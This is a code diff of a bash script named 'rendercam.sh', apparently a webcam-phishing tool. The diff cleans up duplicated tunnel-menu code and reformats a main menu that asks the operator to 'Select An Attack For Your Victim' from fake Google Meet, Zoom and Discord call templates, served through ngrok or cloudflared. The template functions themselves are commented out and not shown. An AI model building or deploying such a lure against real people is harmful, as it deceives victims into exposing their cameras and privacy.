@@ -1,4 +1,3 @@
-  GNU nano 7.2                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 rendercam.sh *                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
 #!/bin/bash
 
 # Rendercam v1.0.0
@@ -671,101 +670,71 @@ start_ngrok() {
 
 ## Tunnel selection
 tunnel_menu() {
-        { clear; banner_small; }
-        cat <<- EOF
-                ${CYAN} 0. Main Menu
-                ${CYAN} 1. Localhost
-                ${CYAN} 2. Ngrok.io
-                ${CYAN} 3. Cloudflared
-        EOF
+	{ clear; banner_small; }
+	cat <<- EOF
+		${CYAN} 0. Main Menu
+		${CYAN} 1. Localhost
+		${CYAN} 2. Ngrok.io
+		${CYAN} 3. Cloudflared
+	EOF
 
-        read -p "${MAGENTA} Select a port forwarding service or return to main menu:"
+	read -p "${MAGENTA} Select a port forwarding service or return to main menu:"
 
-        case $REPLY in 
-                0 | 00)
-                        echo -ne "\n${CYAN} Returning to main menu..."
-                        { sleep 1; main_menu; };;
-                1 | 01)
-                        start_localhost;;
-                2 | 02)
-                        start_ngrok;;
-                3 | 03)
-                        start_cloudflared;;
-                *)
-                        echo -ne "\n${RED} Invalid Option, Try Again..."
-                        { sleep 1; tunnel_menu; };;
-        esac
-}
-
-
-## Tunnel selection
-tunnel_menu() {
-        { clear; banner_small; }
-        cat <<- EOF
-                ${CYAN} 0. Main Menu
-                ${CYAN} 1. Localhost
-                ${CYAN} 2. Ngrok.io
-                ${CYAN} 3. Cloudflared
-        EOF
-
-        read -p "${MAGENTA} Select a port forwarding service or return to main menu:"
-
-        case $REPLY in 
-                0 | 00)
-                        echo -ne "\n${CYAN} Returning to main menu..."
-                        { sleep 1; main_menu; };;
-                1 | 01)
-                        start_localhost;;
-                2 | 02)
-                        start_ngrok;;
-                3 | 03)
-                        start_cloudflared;;
-                *)
-                        echo -ne "\n${RED} Invalid Option, Try Again..."
-                        { sleep 1; tunnel_menu; };;
-        esac
+	case $REPLY in 
+		0 | 00)
+			echo -ne "\n${CYAN} Returning to main menu..."
+			{ sleep 1; main_menu; };;
+		1 | 01)
+			start_localhost;;
+		2 | 02)
+			start_ngrok;;
+		3 | 03)
+			start_cloudflared;;
+		*)
+			echo -ne "\n${RED} Invalid Option, Try Again..."
+			{ sleep 1; tunnel_menu; };;
+	esac
 }
 
 ## Main Menu
 main_menu() {
-        { clear; banner; echo; }
-        cat <<- EOF
-                 ${RED}Select An Attack For Your Victim:
+	{ clear; banner; echo; }
+	cat <<- EOF
+		 ${RED}Select An Attack For Your Victim:
+     ${BRIGHT_BLACK}01. ${BRIGHT_CYAN}Google Meet
+     ${BRIGHT_BLACK}02. ${BRIGHT_CYAN}Zoom Call
+     ${BRIGHT_BLACK}03. ${BRIGHT_CYAN}Discord Call
 
-                 ${WHITE}| ${BRIGHT_BLACK}01. ${BRIGHT_CYAN}Google Meet
-                 ${WHITE}| ${BRIGHT_BLACK}02. ${BRIGHT_CYAN}Zoom Call
-                 ${WHITE}| ${BRIGHT_BLACK}03. ${BRIGHT_CYAN}Discord Call
+     ${BRIGHT_BLACK}99. ${BRIGHT_CYAN}About
+     ${BRIGHT_BLACK}00. ${BRIGHT_CYAN}Exit
 
-                 ${WHITE}| ${BRIGHT_BLACK}99. ${BRIGHT_CYAN}About
-                 ${WHITE}| ${BRIGHT_BLACK}00. ${BRIGHT_CYAN}Exit
+	EOF
 
-        EOF
+	echo
+	read -p " ${BRIGHT_GREEN}Select an option: "
 
-        echo
-        read -p " ${BRIGHT_GREEN}Select an option: "
+	case $REPLY in 
+		1 | 01)
+      printf "\n\e[1;92m[+] Starting Google Meet Template...\e[0m\n"
+      # start_google_meet
+      ;;
+    2 | 02)
+      printf "\n\e[1;92m[+] Starting Zoom Template...\e[0m\n"
+      # start_zoom
+      ;;
+    3 | 03)
+      printf "\n\e[1;92m[+] Starting Discord Template...\e[0m\n"
+      # start_discord
+      ;;
+    99)
+      about;;
+    0 | 00 )
+      msg_exit;;
+    *)
+      echo -ne "\n${RED} Invalid Option, Try Again..."
+      { sleep 1; main_menu; };;
 
-        case $REPLY in 
-                1 | 01)
-                        printf "\n\e[1;92m[+] Starting Google Meet Template...\e[0m\n"
-                        # start_google_meet
-                        ;;
-                2 | 02)
-                        printf "\n\e[1;92m[+] Starting Zoom Template...\e[0m\n"
-                        # start_zoom
-                        ;;
-                3 | 03)
-                        printf "\n\e[1;92m[+] Starting Discord Template...\e[0m\n"
-                        # start_discord
-                        ;;
-                99)
-                        about;;
-                0 | 00)
-                        msg_exit;;
-                *)
-                        echo -ne "\n${RED} Invalid Option, Try Again..."
-                        { sleep 1; main_menu; };;
-
-        esac
+	esac
 }
 
 ## Main
